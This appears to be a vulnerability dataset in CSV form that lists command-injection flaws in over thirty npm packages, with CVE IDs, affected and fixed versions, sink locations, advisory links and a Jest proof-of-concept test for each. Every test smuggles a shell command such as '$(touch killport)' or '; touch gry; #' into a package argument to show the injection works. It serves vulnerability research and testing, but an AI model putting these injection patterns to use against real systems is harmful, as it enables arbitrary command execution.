Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
command-injection,,gry,5.0.8,6.0.0,command-injection/gry_5.0.8,"test(""Command Injection in gry"", (done) => {
  expect.assertions(2);
  const Repo = require(""gry"");
  const fs = require(""fs"");
  const path = ""./gry"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let myRepo = new Repo(""."");
  myRepo.pull(""test; touch gry; #"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,lib/index.js:88:20,https://security.snyk.io/vuln/SNYK-JS-GRY-566987; 
command-injection,CVE-2018-3772,whereis,0.4.0,0.4.1,command-injection/whereis_0.4.0,"test(""Command Injection in whereis"", (done) => {
  expect.assertions(2);
  const whereis = require(""whereis"");
  const fs = require(""fs"");
  const path = ""./whereis"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let filename = ""; touch whereis"";
  whereis(filename, () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/vvo/node-whereis/commit/0f64e3780235004fb6e43bfd153ea3e0e210ee2b,index.js:4:6,https://security.snyk.io/vuln/npm:whereis:20180401; https://github.com/advisories/GHSA-wjr4-2jgw-hmv8
command-injection,,node-unrar,0.1.0,n/a,command-injection/node-unrar_0.1.0,"test(""Remote code execution in node-unrar"", (done) => {
  expect.assertions(2);
  const Unrar = require(""node-unrar"");
  const fs = require(""fs"");
  const path = ""./node-unrar"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    var rar = new Unrar(""/path/to/file.rar"");
    rar._execute([], ""; touch node-unrar;"", function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    });
  } catch (error) {}
});
",n/a,lib/index.js:23:3,; 
command-injection,CVE-2019-15609,kill-port-process,0.0.1,2.2.0,command-injection/kill-port-process_0.0.1,"test(""Command Injection in kill-port-process"", () => {
  expect.assertions(2);
  const killPortProcess = require(""kill-port-process"");
  const fs = require(""fs"");
  const path = ""./kill-port-process"";
  const PORT = ""$(touch kill-port-process)"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return killPortProcess(PORT)
    .then(() => {
      console.log(""here!"");
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
    })
    .catch((err) => {})
    .finally(() => {
      console.log(""here!!!!"");
      if (fs.existsSync(path)) {
        fs.unlinkSync(path);
        console.log(""File removed!:"", path);
      }
    });
});
",n/a,src/index.js:44:4,https://security.snyk.io/vuln/SNYK-JS-KILLPORTPROCESS-543829; 
command-injection,CVE-2020-7632,node-mpv,0.12.2,n/a,command-injection/node-mpv_0.12.2,"test(""Command Injection in node-mpv"", () => {
  expect.assertions(2);
  const Root = require(""node-mpv"");
  const fs = require(""fs"");
  const path = ""./node-mpv"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var options = { binary: '"" $(touch node-mpv) ""' };
  try {
    var root = new Root(options);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,lib/mpv/mpv.js:45:16,https://security.snyk.io/vuln/SNYK-JS-NODEMPV-564426; https://github.com/advisories/GHSA-cqr2-xhg6-p268
command-injection,CVE-2021-23360,killport,1.0.1,1.0.2,command-injection/killport_1.0.1,"test(""Command Injection in killport"", () => {
  expect.assertions(2);
  const killport = require(""killport"");
  const fs = require(""fs"");
  const path = ""./killport"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return killport(""$(touch killport); #"").catch(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {});
  });
});
",https://github.com/ssnau/killport/commit/bec8e371f170a12e11cd222ffc7a6e1ae9942638,index.js:9:8,https://security.snyk.io/vuln/SNYK-JS-KILLPORT-1078535; https://github.com/advisories/GHSA-fc42-h7q4-qp8h
command-injection,CVE-2021-23356,kill-process-by-name,1.0.5,n/a,command-injection/kill-process-by-name_1.0.5,"test(""Command Injection in kill-process-by-name"", (done) => {
  expect.assertions(2);
  const kill_process_by_name = require(""kill-process-by-name"");
  const fs = require(""fs"");
  const path = ""./kill-process-by-name"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  kill_process_by_name(""$(touch kill-process-by-name)"");
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
",n/a,index.js:12:18,https://security.snyk.io/vuln/SNYK-JS-KILLPROCESSBYNAME-1078534; https://github.com/advisories/GHSA-qc65-cgvr-93p6
command-injection,CVE-2021-23376,ffmpegdotjs,0.0.4,n/a,command-injection/ffmpegdotjs_0.0.4,"test(""Command Injection in ffmpegdotjs"", () => {
  expect.assertions(2);
  let ffmpegdotjs = require(""ffmpegdotjs"");
  const fs = require(""fs"");
  const path = ""./ffmpegdotjs"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return ffmpegdotjs
    .trimvideo(""package-lock.json"", 0, 30, ""n || touch ffmpegdotjs; #"")
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",n/a,index.js:191:9,https://security.snyk.io/vuln/SNYK-JS-FFMPEGDOTJS-1078542; https://github.com/advisories/GHSA-f39r-cpmj-whcg
command-injection,,npm-git-publish,0.2.4-beta,n/a,command-injection/npm-git-publish_0.2.4-beta,"test(""Command Injection in npm-git-publish"", () => {
  expect.assertions(2);
  const git = require(""npm-git-publish"");
  const fs = require(""fs"");
  const path = ""./npm-git-publish"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return git
    .publish(""."", ""http://gihub.com ;touch npm-git-publish; #"")
    .catch(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.rmSync(""./gihub.com"", {
        recursive: true,
        force: true,
      });
      fs.unlink(path, function (err) {});
    });
});
",n/a,lib/publish.js:92:29,https://security.snyk.io/vuln/SNYK-JS-NPMGITPUBLISH-541508; https://github.com/advisories/GHSA-49mg-94fc-2fx6
command-injection,CVE-2019-10783,vboxmanage.js,1.0.6,n/a,command-injection/vboxmanage.js_1.0.6,"test(""Command Injection in vboxmanage.js"", () => {
  expect.assertions(2);
  const VBox = require(""vboxmanage.js"");
  const fs = require(""fs"");
  const path = ""./vboxmanag-js"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return VBox.start("";touch vboxmanag-js;"")
    .then(function () {})
    .catch(() => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",https://github.com/danielgindi/node-vboxmanage/commit/8efe421dd19c474cbdeb0908cbcc7aabfe343d5e,index.js:76:23,https://security.snyk.io/vuln/SNYK-JS-VBOXMANAGEJS-607910; https://github.com/advisories/GHSA-whq6-mj2r-mjqc
command-injection,CVE-2019-10801,enpeem,2.2.0,n/a,command-injection/enpeem_2.2.0,"test(""Command Injection in enpeem"", (done) => {
  expect.assertions(2);
  const root = require(""enpeem"");
  const fs = require(""fs"");
  const path = ""./enpeem"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = ""& touch enpeem &"";
  let opts = { production: attack_code };
  root.update(opts, function (err) {
    console.log(""err!"");
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlinkSync(path);
    done();
  });
});
",n/a,index.js:71:22,https://security.snyk.io/vuln/SNYK-JS-ENPEEM-559007; https://github.com/advisories/GHSA-hmw2-mvvh-jf5j
command-injection,CVE-2020-28433,node-latex-pdf,0.0.2,n/a,command-injection/node-latex-pdf_0.0.2,"test(""Command Injection in node-latex-pdf"", (done) => {
  expect.assertions(2);
  const a = require(""node-latex-pdf"");
  const fs = require(""fs"");
  const path = ""./node-latex-pdf"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""./"", ""& touch node-latex-pdf"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlinkSync(path);
    done();
  });
});
",n/a,node-latex-pdf.js:10:5,https://security.snyk.io/vuln/SNYK-JS-NODELATEXPDF-1050426; 
command-injection,CVE-2020-28429,geojson2kml,0.1.1,n/a,command-injection/geojson2kml_0.1.1,"test(""Command Injection in geojson2kml"", (done) => {
  expect.assertions(2);
  const a = require(""geojson2kml"");
  const fs = require(""fs"");
  const path = ""./geojson2kml"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""./"", ""& touch geojson2kml"", function (err) {
    if (err) throw err;
    else {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    }
  });
});
",n/a,index.js:6:3,https://security.snyk.io/vuln/SNYK-JS-GEOJSON2KML-1050412; https://github.com/advisories/GHSA-w83x-fp72-p9qc
command-injection,CVE-2020-7785,node-ps,0.0.2,n/a,command-injection/node-ps_0.0.2,"test(""Command Injection in node-ps"", (done) => {
  expect.assertions(2);
  const a = require(""node-ps"");
  const fs = require(""fs"");
  const path = ""./node-ps"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a.lookup({ psargs: [""& touch node-ps #""] }, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,lib/index.js:72:18,https://security.snyk.io/vuln/SNYK-JS-NODEPS-1048335; https://github.com/advisories/GHSA-4rv9-5vc4-88cg
command-injection,CVE-2018-16462,alfred-workflow-nodejs,2.0.1,2.0.1,command-injection/alfred-workflow-nodejs_2.0.1,"test(""Command Injection in killing"", (done) => {
  expect.assertions(2);
  const AlfredNode = require(""alfred-workflow-nodejs"");
  const fs = require(""fs"");
  const path = ""./alfred-workflow-nodejs"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var utils = AlfredNode.utils;
  utils.wfVars.remove(' ""; touch alfred-workflow-nodejs #', function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/vincentmorneau/apex-publish-static-files/commit/2209af8f2b65c24aa55ab757e0e05b958c16f063,alfredNode.js:445:17,https://security.snyk.io/vuln/SNYK-JS-ALFREDWORKFLOWNODEJS-608975; https://github.com/advisories/GHSA-9jm3-5835-537m
command-injection,CVE-2020-28437,heroku-env,0.2.0,n/a,command-injection/heroku-env_0.2.0,"test(""Command Injection in heroku-env"", (done) => {
  expect.assertions(2);
  const root = require(""heroku-env"");
  const fs = require(""fs"");
  const path = ""./heroku-env"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  root(""& touch heroku-env"", ""aa"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,lib/get.js:3:3,https://security.snyk.io/vuln/SNYK-JS-HEROKUENV-1050432; 
command-injection,CVE-2021-26275,eslint-fixer,0.1.5,n/a,command-injection/eslint-fixer_0.1.5,"test(""Command Injection in eslint-fixer"", () => {
  expect.assertions(2);
  const fix = require(""eslint-fixer"");
  const fs = require(""fs"");
  const path = ""./eslint-fixer"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return fix(""$(touch eslint-fixer)"").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {});
  });
});
",n/a,index.js:24:18,https://security.snyk.io/vuln/SNYK-JS-ESLINTFIXER-1087438; https://github.com/advisories/GHSA-45w5-pvr8-4rh5
command-injection,CVE-2017-16042,growl,1.9.0,1.10.0,command-injection/growl_1.9.0,"test(""Command Injection in growl"", (done) => {
  expect.assertions(2);
  const growl = require(""growl"");
  const fs = require(""fs"");
  const path = ""./growl"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  growl(""`touch growl`"", {}, () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/tj/node-growl/commit/d71177d5331c9de4658aca62e0ac921f178b0669,lib/growl.js:289:3,https://security.snyk.io/vuln/npm:growl:20160721; https://github.com/advisories/GHSA-qh2h-chj9-jffq
command-injection,CVE-2020-7628,umount,1.1.6,n/a,command-injection/umount_1.1.6,"test(""Command Injection in umount"", (done) => {
  expect.assertions(2);
  const root = require(""umount"");
  const fs = require(""fs"");
  const path = ""./umount"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let device = '"" $(touch umount) ""';
  root.umount(device, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,build/umount.js:52:24,https://security.snyk.io/vuln/SNYK-JS-UMOUNT-564265; https://github.com/advisories/GHSA-6q48-vjq2-mwcj
command-injection,CVE-2020-7627,node-key-sender,1.0.11,n/a,command-injection/node-key-sender_1.0.11,"test(""Command Injection in node-key-sender"", () => {
  expect.assertions(2);
  const root = require(""node-key-sender"");
  const fs = require(""fs"");
  const path = ""./node-key-sender"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = [""&touch"", ""node-key-sender""];
  return root.execute(attack_code).then(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",n/a,key-sender.js:117:20,https://security.snyk.io/vuln/SNYK-JS-NODEKEYSENDER-564261; 
command-injection,CVE-2020-28490,async-git,1.13.1,1.13.2,command-injection/async-git_1.13.1,"test(""Command Injection in async-git"", async () => {
  expect.assertions(2);
  const git = require(""async-git"");
  const fs = require(""fs"");
  const path = ""./async-git"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    await git.reset(""$(touch async-git)"");
  } catch (e) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/omrilotan/async-git/commit/d1950a5021f4e19d92f347614be0d85ce991510d,lib/reset/index.js:11:16,https://security.snyk.io/vuln/SNYK-JS-ASYNCGIT-1064877; https://github.com/advisories/GHSA-6qpr-9mc5-7gch
command-injection,CVE-2018-3785,git-dummy-commit,1.3.0,n/a,command-injection/git-dummy-commit_1.3.0,"test(""Command Injection in git-dummy-commit"", () => {
  expect.assertions(2);
  const gitDummyCommit = require(""git-dummy-commit"");
  const fs = require(""fs"");
  const path = ""./git-dummy-commit"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  gitDummyCommit('"";touch git-dummy-commit;""');
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,index.js:37:8,https://security.snyk.io/vuln/npm:git-dummy-commit:20180619; https://github.com/advisories/GHSA-h3c2-x77c-7pvr
command-injection,CVE-2019-10788,strider-git,1.0.3,n/a,command-injection/strider-git_1.0.3,"test(""Command Injection in strider-git"", (done) => {
  expect.assertions(2);
  const git = require(""strider-git/lib"");
  const fs = require(""fs"");
  const path = ""./strider-git"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  git.getBranches(
    {
      auth: {
        type: ""ssaas;touch strider-git; "",
        privkey: ""sss"",
      },
      url: ""http://sss"",
    },
    """",
    function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    }
  );
});
",https://github.com/Turistforeningen/node-im-metadata/commit/ea15dddbe0f65694bfde36b78dd488e90f246639,lib/index.js:151:5,https://security.snyk.io/vuln/SNYK-JS-STRIDERGIT-572913; https://github.com/advisories/GHSA-qfxv-qqvg-24pg
command-injection,CVE-2021-23632,git,0.1.5,n/a,command-injection/git_0.1.5,"test(""Remote code execution in git"", (done) => {
  expect.assertions(2);
  const Git = require(""git"").Git;
  const fs = require(""fs"");
  const path = ""./git"";
  let repo = new Git(""repo-test"");
  let user_input = ""; touch git"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    repo.git(user_input, function (err, result) {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    });
  } catch (error) {}
});
",n/a,lib/git/git.js:232:3,https://security.snyk.io/vuln/SNYK-JS-GIT-1568518; 
command-injection,CVE-2020-28423,monorepo-build,0.1.9,n/a,command-injection/monorepo-build_0.1.9,"test(""Command Injection in monorepo-build"", (done) => {
  expect.assertions(2);
  var a = require(""monorepo-build"");
  const fs = require(""fs"");
  const path = ""./monorepo-build"";
  var execSync = require(""child_process"").execSync;
  var user_name = """";
  var user_email = """";
  try {
    const cmd = ""git config user.email"";
    user_email = execSync(cmd).toString().trim();
  } catch (error) {}
  try {
    const cmd = ""git config user.name"";
    user_name = execSync(cmd).toString().trim();
  } catch (error) {}
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.build(""./"", ""& touch monorepo-build"");
  } catch (error) {
    console.log(""syntax-error"");
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {
    try {
      const cmd = `git config user.name ""${user_name}""`;
      execSync(cmd).toString();
    } catch (error) {
      console.log(error);
    }
    try {
      const cmd = `git config user.email ""${user_email}""`;
      execSync(cmd).toString();
    } catch (error) {
      console.log(error);
    }
    done();
  });
});
",n/a,lib/util/exec.js:4:54,https://security.snyk.io/vuln/SNYK-JS-MONOREPOBUILD-1050392; 
command-injection,CVE-2021-23399,wincred,1.0.2,n/a,command-injection/wincred_1.0.2,"test(""Command Injection in wincred"", () => {
  expect.assertions(2);
  const wincred = require(""wincred"");
  const fs = require(""fs"");
  const path = ""./wincred"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return wincred.getCredential(""|| touch wincred"").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {});
  });
});
",n/a,index.js:16:17,https://security.snyk.io/vuln/SNYK-JS-WINCRED-1078538; https://github.com/advisories/GHSA-v85c-hgq5-7pfw
command-injection,CVE-2021-23348,portprocesses,1.0.4,1.0.5,command-injection/portprocesses_1.0.4,"test(""Command Injection in portprocesses"", () => {
  expect.assertions(2);
  const portprocesses = require(""portprocesses"");
  const fs = require(""fs"");
  const path = ""./portprocesses"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return portprocesses.killProcess(""$(touch portprocesses)"").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {});
  });
});
",https://github.com/rrainn/PortProcesses/commit/86811216c9b97b01b5722f879f8c88a7aa4214e1,exec.js:5:3,https://security.snyk.io/vuln/SNYK-JS-PORTPROCESSES-1078536; https://github.com/advisories/GHSA-vm67-7vmg-66vm
command-injection,CVE-2021-23379,portkiller,1.0.2,n/a,command-injection/portkiller_1.0.2,"test(""Command Injection in portkiller"", (done) => {
  expect.assertions(2);
  const portkiller = require(""portkiller"");
  const fs = require(""fs"");
  const path = ""./portkiller"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  portkiller(""$(touch portkiller)"");
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
",n/a,index.js:10:5,https://security.snyk.io/vuln/SNYK-JS-PORTKILLER-1078537; https://github.com/advisories/GHSA-r6fw-8m27-43c9
command-injection,,local-devices,2.0.0,3.0.0,command-injection/local-devices_2.0.0,"test(""Command Injection in local-devices"", () => {
  expect.assertions(2);
  const find = require(""local-devices"");
  const fs = require(""fs"");
  const path = ""./local-devices"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let userInput = ""127.0.0.1 | touch local-devices"";
  return find(userInput).then(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",n/a,src/index.js:114:13,https://security.snyk.io/vuln/SNYK-JS-LOCALDEVICES-459898; https://github.com/advisories/GHSA-w725-67p7-xv22
command-injection,,imagickal,5.0.1,n/a,command-injection/imagickal_5.0.1,"test(""Remote code execution in imagickal"", () => {
  expect.assertions(2);
  const im = require(""imagickal"");
  const fs = require(""fs"");
  const path = ""./imagickal"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return im
    .identify("";touch imagickal;"")
    .catch((err) => {})
    .finally(() => {
      console.log(""finally!"");
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",n/a,lib/imagickal.js:127:17,https://security.snyk.io/vuln/SNYK-JS-IMAGICKAL-1060040; 
command-injection,CVE-2021-29300,samsung-remote,1.2.5,1.5.2,command-injection/samsung-remote_1.2.5,"test(""Command Injection in samsung-remote"", (done) => {
  expect.assertions(2);
  const SamsungRemote = require(""samsung-remote"");
  const fs = require(""fs"");
  const path = ""./samsung-remote"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var remote = new SamsungRemote({ ip: ""127.0.0.1; touch samsung-remote;"" });
  remote.isAlive(function (err) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/ronomon/opened/commit/7effe011d4fea8fac7f78c00615e0a6e69af68ec,lib/samsung-remote.js:103:16,https://security.snyk.io/vuln/SNYK-JS-SAMSUNGREMOTE-72278; https://github.com/advisories/GHSA-fg5w-w99f-rj6w
command-injection,CVE-2019-10787,im-resize,2.3.2,n/a,command-injection/im-resize_2.3.2,"test(""Command Injection in im-resize"", (done) => {
  expect.assertions(2);
  const root = require(""im-resize"");
  const fs = require(""fs"");
  const path = ""./im-resize"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let image = { path: ""& touch im-resize &"" };
  let output = { versions: [] };
  root(image, output, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/Turistforeningen/node-im-resize/commit/de624dacf6a50e39fe3472af1414d44937ce1f03,index.js:11:3,https://security.snyk.io/vuln/SNYK-JS-IMRESIZE-544183; https://github.com/advisories/GHSA-r9vm-rhmf-7hxx
command-injection,CVE-2020-28432,theme-core,0.2.5,n/a,command-injection/theme-core_0.2.5,"test(""Command Injection in theme-core"", (done) => {
  expect.assertions(2);
  const a = require(""theme-core"");
  const fs = require(""fs"");
  const path = ""./theme-core"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a.utils.sh(""touch theme-core"", true, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
    done();
  });
});
",n/a,lib/utils.js:16:17,https://security.snyk.io/vuln/SNYK-JS-THEMECORE-1050425; 
